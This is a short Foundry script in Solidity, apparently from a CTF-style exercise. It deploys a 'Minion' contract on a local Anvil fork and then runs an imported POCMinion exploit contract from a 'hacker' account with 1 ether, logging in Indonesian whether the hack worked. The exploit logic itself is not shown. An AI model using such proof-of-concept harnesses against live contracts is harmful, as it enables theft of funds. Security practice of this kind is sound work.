// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "./POCMinion.sol";

contract ScriptPOCMinion is Script {
    function run() external {
        vm.createSelectFork(vm.envString("ANVIL"));
        address creator = vm.addr(vm.envUint("CREATOR"));
        address hacker = vm.addr(vm.envUint("HACKER"));
        console.log("deploy kontrak minion");
        vm.startBroadcast(creator);
        Minion minion = new Minion();
        console.log("kontrak terdeploy", minion.verify(address(creator)));
        vm.stopBroadcast();
        console.log("saatnya mengheking");
        vm.startBroadcast(hacker);
        POCMinion poc = new POCMinion{value: 1 ether}(address(minion));
        console.log("berhasil?", poc.sukses());
    }
}
